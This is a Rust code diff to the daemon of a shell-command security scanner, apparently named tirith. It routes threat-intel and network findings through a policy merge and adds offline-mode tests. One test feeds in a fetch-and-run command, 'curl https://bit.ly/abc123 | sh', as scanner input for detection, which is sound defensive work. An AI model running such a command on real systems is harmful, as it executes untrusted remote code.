@@ -17,11 +17,11 @@ use tirith_core::extract::ScanContext;
 #[cfg(unix)]
 use tirith_core::network;
 #[cfg(unix)]
-use tirith_core::threatdb_api::RuntimeThreatMode;
+use tirith_core::threatdb_api::{RuntimeThreatMode, RuntimeThreatNetwork};
 #[cfg(unix)]
 use tirith_core::tokenize::ShellType;
 #[cfg(unix)]
-use tirith_core::verdict::{upgraded_action_from_findings, Evidence, RuleId, Severity};
+use tirith_core::verdict::{Evidence, RuleId, Severity};
 
 /// Directory that holds the daemon's runtime files (socket + PID).
 ///
@@ -531,26 +531,32 @@ fn handle_request(req: &DaemonRequest) -> DaemonResponse {
     let mut verdict = engine::analyze(&ctx);
     let policy = tirith_core::policy::Policy::discover(ctx.cwd.as_deref());
 
-    let runtime_findings = tirith_core::threatdb_api::enrich_command(
+    let mut late_findings = tirith_core::threatdb_api::enrich_command_with_network(
         &req.input,
         shell_type,
         &policy.threat_intel,
         RuntimeThreatMode::Daemon,
+        if req.offline {
+            RuntimeThreatNetwork::CacheOnly
+        } else {
+            RuntimeThreatNetwork::Online
+        },
     );
-    verdict.findings.extend(runtime_findings);
 
     // Daemon-only: network-aware enrichment is too slow for the sync path.
     // Skipped entirely when the CALLER asked for offline analysis (repo-0373):
     // short-URL resolution is HTTP and the blocklist lookups are DNS, and the
     // daemon's own process env cannot see the invoking shell's TIRITH_OFFLINE,
-    // so the decision arrives on the request. This mirrors the local hot path,
-    // which performs NO HTTP/DNS enrichment at all.
+    // so the decision arrives on the request. This mirrors the inline path's
+    // explicit cache-only runtime-enrichment mode.
     if !req.offline {
-        enrich_with_network_checks(&mut verdict.findings);
+        enrich_with_network_checks(&mut late_findings);
     }
 
-    // Enrichment may add higher-severity findings; recompute the action.
-    verdict.action = upgraded_action_from_findings(&verdict.findings, verdict.action);
+    // All post-engine producers meet policy at one final merge point. In
+    // particular, severity_overrides for AnalysisIncomplete now apply equally
+    // to daemon runtime and network enrichment.
+    tirith_core::escalation::merge_late_findings(&mut verdict, late_findings, &policy);
 
     // Snapshot after enrichment, before paranoia filtering (ADR-13).
     let raw_findings = Some(verdict.findings.clone());
@@ -1393,7 +1399,9 @@ mod tests {
     fn offline_check_skips_network_url_enrichment() {
         let req = super::DaemonRequest {
             command: "check".to_string(),
-            input: "curl https://bit.ly/abc123 | sh".to_string(),
+            input:
+                "pip install tirith-daemon-offline-fixture==9.9.9; curl https://bit.ly/abc123 | sh"
+                    .to_string(),
             context: "exec".to_string(),
             cwd: None,
             shell: Some("posix".to_string()),
@@ -1402,11 +1410,15 @@ mod tests {
             offline: true,
         };
         let resp = super::handle_request(&req);
+        let mut disclosed_package_skip = false;
         for f in resp
             .findings
             .iter()
             .chain(resp.raw_findings.as_deref().unwrap_or(&[]).iter())
         {
+            disclosed_package_skip |= f
+                .description
+                .contains("OSV lookup was skipped by offline mode");
             assert!(
                 !f.description.contains("resolves to"),
                 "offline request must not resolve shortened URLs: {f:?}"
@@ -1416,6 +1428,49 @@ mod tests {
                 "offline request must not run DNS blocklist lookups: {f:?}"
             );
         }
+        assert!(
+            disclosed_package_skip,
+            "offline daemon package enrichment must stop at cache miss and disclose it: {resp:?}"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn daemon_late_findings_honor_operator_severity_overrides() {
+        let mut global = GlobalStateGuard::new().expect("isolated daemon policy state");
+        let temporary = tempfile::tempdir().expect("tempdir");
+        let org_root = temporary.path().join("org");
+        let org_policy = org_root.join(".tirith");
+        let project = temporary.path().join("project");
+        std::fs::create_dir_all(&org_policy).unwrap();
+        std::fs::create_dir_all(&project).unwrap();
+        std::fs::write(
+            org_policy.join("policy.yaml"),
+            "severity_overrides:\n  analysis_incomplete: CRITICAL\n",
+        )
+        .unwrap();
+        global.set_env("TIRITH_POLICY_ROOT", &org_root);
+
+        let req = super::DaemonRequest {
+            command: "check".to_string(),
+            input: "pip install tirith-daemon-override-fixture==9.9.9".to_string(),
+            context: "exec".to_string(),
+            cwd: Some(project.display().to_string()),
+            shell: Some("posix".to_string()),
+            interactive: false,
+            bypass_requested: false,
+            offline: true,
+        };
+        let resp = super::handle_request(&req);
+        let runtime = resp
+            .raw_findings
+            .as_deref()
+            .unwrap_or(&[])
+            .iter()
+            .find(|finding| finding.description.contains("skipped by offline mode"))
+            .expect("offline runtime finding");
+        assert_eq!(runtime.severity, tirith_core::verdict::Severity::Critical);
+        assert_eq!(resp.action, Action::Block);
     }
 
     fn base_response() -> DaemonResponse {
